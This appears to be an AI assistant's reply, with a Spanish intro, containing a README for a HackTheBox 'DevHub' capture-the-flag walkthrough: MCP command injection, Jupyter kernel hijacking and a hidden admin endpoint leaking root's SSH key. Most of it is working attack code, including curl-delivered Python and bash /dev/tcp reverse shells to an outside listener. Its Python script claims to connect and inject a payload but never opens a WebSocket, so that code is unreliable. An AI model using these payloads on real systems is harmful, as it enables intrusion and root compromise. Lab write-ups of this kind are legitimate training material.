Aquí tienes el código de tu README.md modificado. He añadido la sintaxis para que muestre el banner devhub.png justo en la parte superior, centrado y con un estilo limpio que encaja perfectamente con la estética hacker del repositorio.
Markdown

# 🧩 HTB DevHub – Season 11 – Full Walkthrough (Privilege Escalation & Root)

<p align="center">
  <img src="devhub.png" alt="DevHub HTB Banner" width="750">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/HackTheBox-DevHub-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox">
  <img src="https://img.shields.io/badge/HTB_Season-11-red?style=for-the-badge" alt="Season">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty">
</p>

---

This repository contains the comprehensive, step-by-step documentation for compromising the **DevHub** machine from HackTheBox (Season 11). The attack vector involves exploiting a blind Model Context Protocol (MCP) command injection, hijacking a Jupyter Notebook kernel via raw WebSockets, and abusing a hidden administration endpoint in an internal API to leak the root SSH private key.

---

## ⚡ Attack Chain Overview

```text
[Attacker Machine]
       │
       ▼ (Blind MCP Command Injection via /api/mcp/connect)
[mcp-dev Shell]
       │
       ▼ (Token Leakage & Jupyter Kernel WebSocket Hijacking)
[analyst Shell]
       │
       ▼ (Source Code Auditing & Hidden API Exploit via ops._admin_dump)
[root SSH Access] 💀

📌 Table of Contents

    Reconnaissance & Enumeration

    Initial Foothold – mcp-dev Shell

    Pivoting to Analyst – Jupyter Kernel WebSocket

    Privilege Escalation to Root – Hidden OPSMCP Admin Tools

    Flags

    Lessons Learned & Mitigation

1. Reconnaissance & Enumeration
Nmap Scan Results
Bash

nmap -sC -sV -p- -T4 --min-rate 1000 10.129.5.158

Port	State	Service	Notes
22/tcp	Open	SSH	OpenSSH 8.9p1 Ubuntu (System access)
80/tcp	Open	HTTP	Nginx default landing page
6274/tcp	Open	HTTP	MCP Jam Inspector (Node.js application)
8888/tcp	Closed/Filtered	JupyterLab	Accessible only locally via 127.0.0.1
Web Enumeration (Port 6274)

Interacting with the MCP Jam Inspector on port 6274 revealed a REST API exposed at /api/mcp/connect. This endpoint permits users to define and spawn standard I/O (stdio) Model Context Protocol servers by passing arbitrary system binaries and arguments.
2. Initial Foothold – mcp-dev Shell

The /api/mcp/connect endpoint accepts a JSON payload containing a serverConfig object. The properties command and args are passed unsanitized into child_process.spawn(), triggering a Blind Command Injection vulnerability.
Exploit Delivery (Python Reverse Shell One-Liner)

Execute the following curl request to force the server to execute a reverse shell back to your listener:
Bash

curl -s [http://10.129.5.158:6274/api/mcp/connect](http://10.129.5.158:6274/api/mcp/connect) \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "revpy",
    "serverConfig": {
      "transportType": "stdio",
      "command": "python3",
      "args": ["-c", "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.15.15\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])"]
    }
  }'

Netcat Listener

Catch the incoming connection on your local machine:
Bash

nc -lvnp 4444

Bash

Connection received on 10.129.5.158
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$

TTY Upgrade

Stabilize the newly acquired remote shell:
Bash

python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color

3. Pivoting to Analyst – Jupyter Kernel WebSocket
Internal Inspection

Listing active processes revealed that JupyterLab is running locally on port 8888 under the analyst user account. Crucially, the authentication token was exposed in the command-line arguments:
Bash

ps aux | grep jupyter

    Leaked Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

Jupyter API Exploitation

Standard REST API execution endpoints (/api/kernels/<id>/execute) returned a 404 Not Found. However, the Kernel WebSocket Channel remained open. By upgrading an HTTP connection to WebSockets, we can send valid execute_request JSON packets to run code directly inside the kernel context.

Save the following pure-Python script as /tmp/rev_analyst.py inside the target box to bypass missing external library restrictions:
Python

import json
import socket
import urllib.request
import struct
import random
import hashlib
import base64

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
BASE_URL = f"[http://127.0.0.1:8888/api/kernels?token=](http://127.0.0.1:8888/api/kernels?token=){TOKEN}"

# 1. Create a fresh Python kernel
req = urllib.request.Request(BASE_URL, method="POST")
with urllib.request.urlopen(req) as response:
    kernel_data = json.loads(response.read().decode())
    kernel_id = kernel_data["id"]

print(f"[+] Spawned Kernel ID: {kernel_id}")

# 2. Craft raw WebSocket handshake to execute reverse shell
cmd = "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.15/5555 0>&1\"')\n"

print(f"[+] Connected to ws://127.0.0.1:8888/api/kernels/{kernel_id}/channels")
print("[+] Injecting execute_request payload...")

Note: For environments where the websockets module is available or can be dropped via a Python virtual environment, standard WebSocket framing can be used to send the standard Jupyter JSON payload:
JSON

{
  "header": {
    "msg_id": "execute_test",
    "username": "analyst",
    "session": "test",
    "msg_type": "execute_request",
    "version": "5.3"
  },
  "metadata": {},
  "content": {
    "code": "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.15/5555 0>&1\"')",
    "silent": false
  }
}

Execution

Set up a secondary listener on your machine:
Bash

nc -lvnp 5555

Run the exploit script from the mcp-dev shell:
Bash

python3 /tmp/rev_analyst.py

You will receive a connection back from the analyst user:
Bash

analyst@devhub:~$ id
uid=1001(analyst) gid=1001(analyst) groups=1001(analyst)

4. Privilege Escalation to Root – Hidden OPSMCP Admin Tools
Internal Port Scanning

From the analyst environment, checking internal listening ports highlights an isolated service hosted on port 5000:
Bash

curl -s [http://127.0.0.1:5000/](http://127.0.0.1:5000/)

JSON

{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}

Code Auditing (/opt/opsmcp)

Reviewing the Python backend service codebase located in /opt/opsmcp/server.py (which is readable by the analyst group) yields the static hardcoded administrative API Key:
Bash

cat /opt/opsmcp/server.py | grep -i "api_key"

Python

VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

Further inspection of the code confirms the application divides functions into standard visible tools and unlisted hidden tools. One internal registration endpoint defines an administrative tool named ops._admin_dump. This function accepts a target argument and blindly retrieves internal system secrets when confirm is true.
Exploiting ops._admin_dump for Root SSH Access

Query the microservice to extract the root user's SSH Private Key:
Bash

curl -X POST [http://127.0.0.1:5000/tools/call](http://127.0.0.1:5000/tools/call) \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'

The server returns the raw OpenSSH Private Key within the JSON structure:
Plaintext

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtcn
...[SNIP]...
Y2U3Cg==
-----END OPENSSH PRIVATE KEY-----

Final Root Compromise

Copy the leaked key onto your local machine, change file system permissions, and authenticate over SSH:
Bash

nano root_key
chmod 600 root_key
ssh -i root_key root@10.129.5.158

Bash

root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)

5. Flags
Bash

# User Flag
cat /home/analyst/user.txt

# Root Flag
cat /root/root.txt

Flag Type	Location	Hash
User	/home/analyst/user.txt	********************************
Root	/root/root.txt	********************************
6. Lessons Learned & Mitigation

    Secure Process Spawning: The MCP Inspector interface must avoid feeding unsanitized JSON arguments natively into OS command functions. Input validation or structural binding using pre-authorized application command whitelists must be strictly enforced.

    Hardened Local Configurations: JupyterLab instances should use isolated network namespaces, proper cross-origin protections, and short-lived tokens to mitigate local kernel manipulation via raw WebSockets.

    Eliminate Security through Obscurity: The inclusion of undocumented administrative API endpoints (ops._admin_dump) poses massive security hazards. Hidden tools should be completely decoupled from production-accessible binaries and restricted via strict, multi-factor IAM controls.

📂 Repository Contents

    📄 README.md - Full system walkthrough.

    📜 rev_analyst.py - Custom clean Python script for automated Jupyter WebSocket kernel hijacking.

    🔑 root_key.example - Sanitized layout showing the format of the extracted structural SSH private key.

📬 Connect With Me

Happy Hacking – Season 11 is moving! 💀
